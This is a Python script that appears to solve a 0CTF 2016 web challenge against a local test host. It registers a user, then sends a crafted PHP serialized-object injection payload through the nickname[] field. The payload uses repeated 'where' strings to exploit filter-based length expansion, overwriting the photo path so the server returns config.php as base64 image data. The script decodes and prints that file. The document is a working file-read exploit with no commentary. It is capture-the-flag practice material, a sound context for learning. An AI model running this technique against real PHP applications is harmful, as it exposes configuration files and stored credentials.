#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/05/28, 15:26
"""

import requests
import re
import base64

req = requests.Session()
URL = 'http://0ctf2016.local.virzz.com'


def register():
    data = {
        "username": 'vvvvvv',
        "password": 'vvvvvv'
    }
    res = req.post(URL+'/register.php', data=data)
    if res.status_code == 200:
        return True
    else:
        return False


def login():
    data = {
        "username": 'vvvvvv',
        "password": 'vvvvvv'
    }
    res = req.post(URL+'/index.php', data=data)
    if res.status_code == 200:
        return True
    else:
        return False


def getany(f="config.php"):
    _len = 19 + len(f) + len(str(len(f)))
    playload = '";}s:5:"photo";s:'+str(len(f))+':"'+f
    return "where"*_len + playload


def post(payload):
    png = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAADIAAAAUAQMAAAD1BPzZA\
        AAABlBMVEX////pDluRy52jAAAALUlEQVQImWNgIBGwdDAxgekGBgg90y3IAUR3Lsp\
        uANLMnExeID6zLDuYphAAAAkjBe/tZJd7AAAAAElFTkSuQmCC")
    files = {
        "photo": ('test.png', png, 'image/png'),
    }
    data = {
        "phone": "12345678901",
        "email": "example@icq.com",
        "nickname[]": payload
    }
    res = req.post(URL+'/update.php', data=data, files=files)
    if res.status_code == 200:
        return True
    else:
        return False


def get():
    res = req.get(URL+'/profile.php')
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        m = re.findall(r'<img src="data:image/gif;base64,(.*?)"', html)
        if m and len(m) > 0:
            print(base64.b64decode(m[0]).decode('utf-8'))
    else:
        return False


if __name__ == '__main__':
    register()
    login()
    pl = getany('config.php')
    print(pl)
    if post(pl):
        get()
